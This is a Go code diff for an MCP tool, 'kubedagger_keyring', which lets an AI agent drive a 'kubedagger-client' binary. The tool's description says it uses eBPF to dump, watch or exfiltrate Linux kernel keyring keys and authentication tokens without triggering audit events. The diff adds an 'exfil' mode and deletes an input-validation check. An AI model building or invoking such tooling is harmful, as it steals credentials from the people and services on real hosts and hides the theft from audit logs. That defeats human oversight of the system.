@@ -11,10 +11,8 @@ import (
 )
 
 type KeyringInput struct {
-	Action   string `json:"action"`
-	KeyID    string `json:"key_id,omitempty"`
-	KeyType  string `json:"key_type,omitempty"`
-	Duration int    `json:"duration,omitempty"`
+	Mode    string `json:"mode,omitempty"`
+	KeyType string `json:"key_type,omitempty"`
 }
 
 type KeyringTool struct {
@@ -28,33 +26,24 @@ func NewKeyring(exec executor.Executor) *KeyringTool {
 func (t *KeyringTool) Name() string { return "kubedagger_keyring" }
 
 func (t *KeyringTool) Description() string {
-	return "Access the Linux kernel keyring to list, dump, or monitor cryptographic keys and authentication tokens stored by services. Intercepts keyring syscalls via eBPF to extract keys without triggering audit events."
+	return "Access the Linux kernel keyring to dump, watch, or exfiltrate cryptographic keys and authentication tokens stored by services. Intercepts keyring syscalls via eBPF to extract keys without triggering audit events."
 }
 
 func (t *KeyringTool) InputSchema() json.RawMessage {
 	return json.RawMessage(`{
 		"type": "object",
 		"properties": {
-			"action": {
+			"mode": {
 				"type": "string",
-				"enum": ["list", "dump", "monitor"],
-				"description": "Keyring operation: list keys, dump contents, or monitor new additions"
-			},
-			"key_id": {
-				"type": "string",
-				"description": "Specific key ID to target"
+				"enum": ["dump", "watch", "exfil"],
+				"description": "Keyring operation: dump current keys, watch for new additions, or exfiltrate keys (default: dump)"
 			},
 			"key_type": {
 				"type": "string",
-				"enum": ["user", "logon", "keyring", "big_key", "all"],
-				"description": "Key type filter"
-			},
-			"duration": {
-				"type": "integer",
-				"description": "Monitor duration in seconds"
+				"enum": ["user", "logon", "session", "all"],
+				"description": "Key type filter (default: all)"
 			}
-		},
-		"required": ["action"]
+		}
 	}`)
 }
 
@@ -64,19 +53,12 @@ func (t *KeyringTool) Execute(ctx context.Context, params json.RawMessage) (*mcp
 		return errorResult("invalid input: " + err.Error()), nil
 	}
 
-	if err := validateSafeString(input.KeyID, "key_id"); err != nil {
-		return errorResult(err.Error()), nil
-	}
-
-	args := []string{"keyring", input.Action}
-	if input.KeyID != "" {
-		args = append(args, "--key-id", input.KeyID)
+	args := []string{"keyring"}
+	if input.Mode != "" {
+		args = append(args, "--mode", input.Mode)
 	}
 	if input.KeyType != "" {
 		args = append(args, "--key-type", input.KeyType)
-	}
-	if input.Duration > 0 {
-		args = append(args, "--duration", fmt.Sprintf("%d", input.Duration))
 	}
 
 	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
@@ -90,7 +72,11 @@ func (t *KeyringTool) Execute(ctx context.Context, params json.RawMessage) (*mcp
 
 	output := strings.TrimSpace(string(result.Stdout))
 	var sb strings.Builder
-	fmt.Fprintf(&sb, "## KubeDagger Keyring: %s\n\n", input.Action)
+	mode := input.Mode
+	if mode == "" {
+		mode = "dump"
+	}
+	fmt.Fprintf(&sb, "## KubeDagger Keyring: %s\n\n", mode)
 	if output == "" {
 		sb.WriteString("No keys found.\n")
 	} else {
